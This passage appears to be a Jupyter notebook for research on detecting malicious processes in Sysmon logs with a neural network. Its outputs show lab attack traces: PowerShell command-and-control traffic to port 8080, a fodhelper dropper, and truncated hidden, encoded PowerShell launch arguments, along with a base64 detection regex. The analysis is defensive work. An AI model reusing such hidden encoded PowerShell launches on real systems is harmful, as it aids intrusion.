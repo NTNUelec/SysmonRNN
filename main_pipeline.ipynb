{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import tensorflow as tf"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Preprocessing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = pd.read_feather('logs.ft')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "Index(['Channel', 'CommandLine', 'Company', 'Computer', 'CreationUtcTime',\n       'CurrentDirectory', 'Description', 'Destination', 'DestinationHostname',\n       'DestinationIp', 'DestinationIsIpv6', 'DestinationPort',\n       'DestinationPortName', 'Details', 'EventID', 'EventRecordID',\n       'EventType', 'FileVersion', 'Hash', 'Hashes', 'Image', 'ImageLoaded',\n       'Initiated', 'IntegrityLevel', 'Keywords', 'Level', 'LogonGuid',\n       'LogonId', 'Name', 'Opcode', 'Operation', 'OriginalFileName',\n       'ParentCommandLine', 'ParentImage', 'ParentProcessGuid',\n       'ParentProcessId', 'PreviousCreationUtcTime', 'ProcessGuid',\n       'ProcessID', 'ProcessId', 'Product', 'Protocol', 'QueryName',\n       'QueryResults', 'QueryStatus', 'RuleName', 'Sig', 'Signature',\n       'SignatureStatus', 'Signed', 'SourceHostname', 'SourceIp',\n       'SourceIsIpv6', 'SourcePort', 'SourcePortName', 'SystemTime',\n       'TargetFilename', 'TargetObject', 'Task', 'TerminalSessionId',\n       'ThreadID', 'Type', 'User', 'UserID', 'UtcTime', 'Version', 'raw'],\n      dtype='object')"
     },
     "metadata": {},
     "execution_count": 3
    }
   ],
   "source": [
    "df.columns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "100"
     },
     "metadata": {},
     "execution_count": 4
    }
   ],
   "source": [
    "# total 100 processes\n",
    "len(df.ProcessId.value_counts().index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "79"
     },
     "metadata": {},
     "execution_count": 5
    }
   ],
   "source": [
    "# 79 have more than 5 sequences\n",
    "len(df.ProcessId.value_counts()[df.ProcessId.value_counts() > 5].index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "1520     284\n9716     168\n9116     164\n3748     115\n10116    110\n9308     108\n4556      98\n4752      91\n1532      91\n7584      90\nName: ProcessId, dtype: int64"
     },
     "metadata": {},
     "execution_count": 6
    }
   ],
   "source": [
    "# 10 longest sequences are from 90 to 280\n",
    "df.ProcessId.value_counts()[0:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "                                                  Image    DestinationIp  \\\n3     C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...  192.168.124.135   \n6     C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...  192.168.124.135   \n14    C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...  192.168.124.135   \n26    C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...  192.168.124.135   \n27    C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...  192.168.124.135   \n...                                                 ...              ...   \n2606  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...             None   \n2607  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...             None   \n2608  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...             None   \n2609  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...             None   \n2610  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...             None   \n\n     DestinationPort  \n3               8080  \n6               8080  \n14              8080  \n26              8080  \n27              8080  \n...              ...  \n2606            None  \n2607            None  \n2608            None  \n2609            None  \n2610            None  \n\n[284 rows x 3 columns]",
      "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>Image</th>\n      <th>DestinationIp</th>\n      <th>DestinationPort</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>3</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>192.168.124.135</td>\n      <td>8080</td>\n    </tr>\n    <tr>\n      <th>6</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>192.168.124.135</td>\n      <td>8080</td>\n    </tr>\n    <tr>\n      <th>14</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>192.168.124.135</td>\n      <td>8080</td>\n    </tr>\n    <tr>\n      <th>26</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>192.168.124.135</td>\n      <td>8080</td>\n    </tr>\n    <tr>\n      <th>27</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>192.168.124.135</td>\n      <td>8080</td>\n    </tr>\n    <tr>\n      <th>...</th>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n    </tr>\n    <tr>\n      <th>2606</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>None</td>\n      <td>None</td>\n    </tr>\n    <tr>\n      <th>2607</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>None</td>\n      <td>None</td>\n    </tr>\n    <tr>\n      <th>2608</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>None</td>\n      <td>None</td>\n    </tr>\n    <tr>\n      <th>2609</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>None</td>\n      <td>None</td>\n    </tr>\n    <tr>\n      <th>2610</th>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>None</td>\n      <td>None</td>\n    </tr>\n  </tbody>\n</table>\n<p>284 rows × 3 columns</p>\n</div>"
     },
     "metadata": {},
     "execution_count": 7
    }
   ],
   "source": [
    "# longest sequence process - powershell communication (as known it's C&C - malicious)\n",
    "df[df.ProcessId == '1520'][['Image','DestinationIp', 'DestinationPort']]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "['C:\\\\Windows\\\\SystemApps\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\MicrosoftEdge.exe']\n"
    },
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "7     158\n11      6\n22      3\n1       1\nName: EventID, dtype: int64"
     },
     "metadata": {},
     "execution_count": 8
    }
   ],
   "source": [
    "# second verbose - MS Edge with lots of ImageLoad events - valid process\n",
    "print(df[df.ProcessId == '9716'].Image.unique())\n",
    "df[df.ProcessId == '9716']['EventID'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "6432     4\n5080     3\n9992     2\n1456     2\n8048     2\n8452     2\n672      2\n1164     1\n10760    1\n8280     1\n9092     1\n8888     1\n6192     1\n7408     1\n8052     1\n8720     1\n9016     1\n1552     1\n1908     1\n2724     1\nName: ProcessId, dtype: int64"
     },
     "metadata": {},
     "execution_count": 15
    }
   ],
   "source": [
    "# last ~20 have less than 5 events\n",
    "df.ProcessId.value_counts()[-20:]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "fields = ['UtcTime', 'ProcessId', 'EventID', 'User', 'Image', 'ImageLoaded', 'CommandLine',\n",
    "            'ParentImage', 'ParentCommandLine', 'DestinationPort', 'Protocol', 'QueryName', 'TargetFilename', 'TargetObject', 'raw']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "                      UtcTime ProcessId EventID                  User  \\\n2894  2020-05-12 14:54:28.231      6432       5                  None   \n2895  2020-05-12 14:54:28.215      6432       7                  None   \n2896  2020-05-12 14:54:28.215      6432       7                  None   \n2897  2020-05-12 14:54:28.225      6432       1  DESKTOP-TATBGQH\\anon   \n\n                                  Image                        ImageLoaded  \\\n2894  C:\\Windows\\System32\\fodhelper.exe                               None   \n2895  C:\\Windows\\System32\\fodhelper.exe      C:\\Windows\\System32\\ntdll.dll   \n2896  C:\\Windows\\System32\\fodhelper.exe  C:\\Windows\\System32\\fodhelper.exe   \n2897  C:\\Windows\\System32\\fodhelper.exe                               None   \n\n                               CommandLine  \\\n2894                                  None   \n2895                                  None   \n2896                                  None   \n2897  \"C:\\Windows\\system32\\fodhelper.exe\"    \n\n                                            ParentImage  \\\n2894                                               None   \n2895                                               None   \n2896                                               None   \n2897  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...   \n\n                                      ParentCommandLine DestinationPort  \\\n2894                                               None            None   \n2895                                               None            None   \n2896                                               None            None   \n2897  \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\po...            None   \n\n     Protocol QueryName TargetFilename TargetObject  \\\n2894     None      None           None         None   \n2895     None      None           None         None   \n2896     None      None           None         None   \n2897     None      None           None         None   \n\n                                                    raw  \n2894  <Event xmlns=\"http://schemas.microsoft.com/win...  \n2895  <Event xmlns=\"http://schemas.microsoft.com/win...  \n2896  <Event xmlns=\"http://schemas.microsoft.com/win...  \n2897  <Event xmlns=\"http://schemas.microsoft.com/win...  ",
      "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>UtcTime</th>\n      <th>ProcessId</th>\n      <th>EventID</th>\n      <th>User</th>\n      <th>Image</th>\n      <th>ImageLoaded</th>\n      <th>CommandLine</th>\n      <th>ParentImage</th>\n      <th>ParentCommandLine</th>\n      <th>DestinationPort</th>\n      <th>Protocol</th>\n      <th>QueryName</th>\n      <th>TargetFilename</th>\n      <th>TargetObject</th>\n      <th>raw</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>2894</th>\n      <td>2020-05-12 14:54:28.231</td>\n      <td>6432</td>\n      <td>5</td>\n      <td>None</td>\n      <td>C:\\Windows\\System32\\fodhelper.exe</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>2895</th>\n      <td>2020-05-12 14:54:28.215</td>\n      <td>6432</td>\n      <td>7</td>\n      <td>None</td>\n      <td>C:\\Windows\\System32\\fodhelper.exe</td>\n      <td>C:\\Windows\\System32\\ntdll.dll</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>2896</th>\n      <td>2020-05-12 14:54:28.215</td>\n      <td>6432</td>\n      <td>7</td>\n      <td>None</td>\n      <td>C:\\Windows\\System32\\fodhelper.exe</td>\n      <td>C:\\Windows\\System32\\fodhelper.exe</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>2897</th>\n      <td>2020-05-12 14:54:28.225</td>\n      <td>6432</td>\n      <td>1</td>\n      <td>DESKTOP-TATBGQH\\anon</td>\n      <td>C:\\Windows\\System32\\fodhelper.exe</td>\n      <td>None</td>\n      <td>\"C:\\Windows\\system32\\fodhelper.exe\"</td>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\po...</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n  </tbody>\n</table>\n</div>"
     },
     "metadata": {},
     "execution_count": 17
    }
   ],
   "source": [
    "# all processes with less than 3 sequences are valid... simple malicious dropper generated in our case 4 events\n",
    "df[df.ProcessId == '6432'][fields]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "newdf = df[fields]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "                      UtcTime ProcessId EventID                  User  \\\n0     2020-05-12 15:05:19.447      5380       7                  None   \n1     2020-05-12 15:05:19.493      5380      11                  None   \n2     2020-05-12 15:05:19.337      5080      11                  None   \n3     2020-05-12 15:05:17.066      1520       3  DESKTOP-TATBGQH\\anon   \n4     2020-05-12 15:05:13.770         4       3   NT AUTHORITY\\SYSTEM   \n...                       ...       ...     ...                   ...   \n3767  2020-05-12 14:53:16.220      7544       7                  None   \n3768  2020-05-12 14:53:16.201      5264       1   NT AUTHORITY\\SYSTEM   \n3769  2020-05-12 14:53:16.141      7544       7                  None   \n3770  2020-05-12 14:53:16.126      7544       7                  None   \n3771  2020-05-12 14:53:16.017      5380       7                  None   \n\n                                                  Image  \\\n0                               C:\\Windows\\explorer.exe   \n1                               C:\\Windows\\Explorer.EXE   \n2                           C:\\Windows\\system32\\mmc.exe   \n3     C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...   \n4                                                System   \n...                                                 ...   \n3767              C:\\Windows\\System32\\RuntimeBroker.exe   \n3768                    C:\\Windows\\System32\\svchost.exe   \n3769              C:\\Windows\\System32\\RuntimeBroker.exe   \n3770              C:\\Windows\\System32\\RuntimeBroker.exe   \n3771                            C:\\Windows\\explorer.exe   \n\n                                            ImageLoaded  \\\n0       C:\\Windows\\System32\\Windows.System.Launcher.dll   \n1                                                  None   \n2                                                  None   \n3                                                  None   \n4                                                  None   \n...                                                 ...   \n3767                    C:\\Windows\\System32\\mssprxy.dll   \n3768                                               None   \n3769  C:\\Windows\\System32\\Windows.StateRepositoryPS.dll   \n3770  C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll   \n3771             C:\\Windows\\System32\\execmodelproxy.dll   \n\n                                            CommandLine  \\\n0                                                  None   \n1                                                  None   \n2                                                  None   \n3                                                  None   \n4                                                  None   \n...                                                 ...   \n3767                                               None   \n3768  C:\\Windows\\system32\\svchost.exe -k wsappx -p -...   \n3769                                               None   \n3770                                               None   \n3771                                               None   \n\n                           ParentImage                 ParentCommandLine  \\\n0                                 None                              None   \n1                                 None                              None   \n2                                 None                              None   \n3                                 None                              None   \n4                                 None                              None   \n...                                ...                               ...   \n3767                              None                              None   \n3768  C:\\Windows\\System32\\services.exe  C:\\Windows\\system32\\services.exe   \n3769                              None                              None   \n3770                              None                              None   \n3771                              None                              None   \n\n     DestinationPort Protocol QueryName  \\\n0               None     None      None   \n1               None     None      None   \n2               None     None      None   \n3               8080      tcp      None   \n4                137      udp      None   \n...              ...      ...       ...   \n3767            None     None      None   \n3768            None     None      None   \n3769            None     None      None   \n3770            None     None      None   \n3771            None     None      None   \n\n                                         TargetFilename TargetObject  \\\n0                                                  None         None   \n1     C:\\Users\\anon\\AppData\\Roaming\\Microsoft\\Window...         None   \n2                  C:\\Users\\anon\\Desktop\\xmlEvents2.xml         None   \n3                                                  None         None   \n4                                                  None         None   \n...                                                 ...          ...   \n3767                                               None         None   \n3768                                               None         None   \n3769                                               None         None   \n3770                                               None         None   \n3771                                               None         None   \n\n                                                    raw  \n0     <Event xmlns=\"http://schemas.microsoft.com/win...  \n1     <Event xmlns=\"http://schemas.microsoft.com/win...  \n2     <Event xmlns=\"http://schemas.microsoft.com/win...  \n3     <Event xmlns=\"http://schemas.microsoft.com/win...  \n4     <Event xmlns=\"http://schemas.microsoft.com/win...  \n...                                                 ...  \n3767  <Event xmlns=\"http://schemas.microsoft.com/win...  \n3768  <Event xmlns=\"http://schemas.microsoft.com/win...  \n3769  <Event xmlns=\"http://schemas.microsoft.com/win...  \n3770  <Event xmlns=\"http://schemas.microsoft.com/win...  \n3771  <Event xmlns=\"http://schemas.microsoft.com/win...  \n\n[3772 rows x 15 columns]",
      "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>UtcTime</th>\n      <th>ProcessId</th>\n      <th>EventID</th>\n      <th>User</th>\n      <th>Image</th>\n      <th>ImageLoaded</th>\n      <th>CommandLine</th>\n      <th>ParentImage</th>\n      <th>ParentCommandLine</th>\n      <th>DestinationPort</th>\n      <th>Protocol</th>\n      <th>QueryName</th>\n      <th>TargetFilename</th>\n      <th>TargetObject</th>\n      <th>raw</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>2020-05-12 15:05:19.447</td>\n      <td>5380</td>\n      <td>7</td>\n      <td>None</td>\n      <td>C:\\Windows\\explorer.exe</td>\n      <td>C:\\Windows\\System32\\Windows.System.Launcher.dll</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>1</th>\n      <td>2020-05-12 15:05:19.493</td>\n      <td>5380</td>\n      <td>11</td>\n      <td>None</td>\n      <td>C:\\Windows\\Explorer.EXE</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>C:\\Users\\anon\\AppData\\Roaming\\Microsoft\\Window...</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>2</th>\n      <td>2020-05-12 15:05:19.337</td>\n      <td>5080</td>\n      <td>11</td>\n      <td>None</td>\n      <td>C:\\Windows\\system32\\mmc.exe</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>C:\\Users\\anon\\Desktop\\xmlEvents2.xml</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>3</th>\n      <td>2020-05-12 15:05:17.066</td>\n      <td>1520</td>\n      <td>3</td>\n      <td>DESKTOP-TATBGQH\\anon</td>\n      <td>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>8080</td>\n      <td>tcp</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>4</th>\n      <td>2020-05-12 15:05:13.770</td>\n      <td>4</td>\n      <td>3</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>System</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>137</td>\n      <td>udp</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>...</th>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n    </tr>\n    <tr>\n      <th>3767</th>\n      <td>2020-05-12 14:53:16.220</td>\n      <td>7544</td>\n      <td>7</td>\n      <td>None</td>\n      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n      <td>C:\\Windows\\System32\\mssprxy.dll</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>3768</th>\n      <td>2020-05-12 14:53:16.201</td>\n      <td>5264</td>\n      <td>1</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>None</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k wsappx -p -...</td>\n      <td>C:\\Windows\\System32\\services.exe</td>\n      <td>C:\\Windows\\system32\\services.exe</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>3769</th>\n      <td>2020-05-12 14:53:16.141</td>\n      <td>7544</td>\n      <td>7</td>\n      <td>None</td>\n      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n      <td>C:\\Windows\\System32\\Windows.StateRepositoryPS.dll</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>3770</th>\n      <td>2020-05-12 14:53:16.126</td>\n      <td>7544</td>\n      <td>7</td>\n      <td>None</td>\n      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n      <td>C:\\Windows\\System32\\OneCoreUAPCommonProxyStub.dll</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n    <tr>\n      <th>3771</th>\n      <td>2020-05-12 14:53:16.017</td>\n      <td>5380</td>\n      <td>7</td>\n      <td>None</td>\n      <td>C:\\Windows\\explorer.exe</td>\n      <td>C:\\Windows\\System32\\execmodelproxy.dll</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>None</td>\n      <td>&lt;Event xmlns=\"http://schemas.microsoft.com/win...</td>\n    </tr>\n  </tbody>\n</table>\n<p>3772 rows × 15 columns</p>\n</div>"
     },
     "metadata": {},
     "execution_count": 21
    }
   ],
   "source": [
    "newdf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "# drop all records where ProcessId in NaN (happens for WMI events, cannot classify [TODO: think how to overcome and add to dataset])\n",
    "newdf = newdf[~newdf.ProcessId.isna()]\n",
    "\n",
    "# drop EventID 5 - ProcessTerminated as not valuable\n",
    "newdf.drop(newdf[newdf.EventID == '5'].index, inplace=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "array(['7', '11', '3', '22', '1', '13', '2', '12', '15'], dtype=object)"
     },
     "metadata": {},
     "execution_count": 23
    }
   ],
   "source": [
    "newdf.EventID.unique()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Feature Engineering"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Image\n",
    "\n",
    "Split to binary/path.  \n",
    "\n",
    "TODO: How to encode?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "# get binary name (last part of \"Image\" after \"\\\")\n",
    "newdf['binary'] = newdf.Image.str.split(r'\\\\').apply(lambda x: x[-1].lower())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "# same with binary pathes\n",
    "newdf['path'] = newdf.Image.str.split(r'\\\\').apply(lambda x: '\\\\'.join(x[:-1]).lower())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "Total different unique binaries: 42\n"
    },
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "0      explorer.exe\n1      explorer.exe\n2           mmc.exe\n3    powershell.exe\n4            system\n5            system\n6    powershell.exe\n7        sysmon.exe\n8        fsatps.exe\n9        fsatps.exe\nName: binary, dtype: object"
     },
     "metadata": {},
     "execution_count": 27
    }
   ],
   "source": [
    "print('Total different unique binaries:', newdf['binary'].nunique())\n",
    "newdf['binary'][0:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": "Total different unique paths: 16\n"
    },
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "0                                           c:\\windows\n1                                           c:\\windows\n2                                  c:\\windows\\system32\n3           c:\\windows\\system32\\windowspowershell\\v1.0\n4                                                     \n5                                                     \n6           c:\\windows\\system32\\windowspowershell\\v1.0\n7                                           c:\\windows\n8    c:\\program files (x86)\\f-secure\\psb\\ultralight...\n9    c:\\program files (x86)\\f-secure\\psb\\ultralight...\nName: path, dtype: object"
     },
     "metadata": {},
     "execution_count": 28
    }
   ],
   "source": [
    "print('Total different unique paths:', newdf['path'].nunique())\n",
    "newdf['path'][0:10]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CommandLine arguments"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "3767                           \n3768    -k wsappx -p -s AppXSvc\n3769                           \n3770                           \n3771                           \nName: arguments, dtype: object"
     },
     "metadata": {},
     "execution_count": 29
    }
   ],
   "source": [
    "newdf['arguments'] = newdf.CommandLine.fillna('empty').str.split().apply(lambda x: ' '.join(x[1:]))\n",
    "newdf['arguments'][-5:]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Feature engineer? \n",
    "\n",
    "1. Contains base64?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "# add new features whether suspicious string are in arguments?\n",
    "# 1. base64?\n",
    "import re\n",
    "\n",
    "# will match at least 32 character long consequent string with base64 characters only\n",
    "b64_regex = r\"[a-zA-Z0-9+\\/]{64,}={0,2}\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "output_type": "execute_result",
     "data": {
      "text/plain": "891     -noninteractive -Sta -encodedCommand CgAgACAAI...\n2610    -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBF...\n2775    -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software...\n3409    -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAHIAUw...\nName: arguments, dtype: object"
     },
     "metadata": {},
     "execution_count": 31
    }
   ],
   "source": [
    "# test on some\n",
    "newdf['arguments'][newdf['arguments'].str.contains('enc')]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
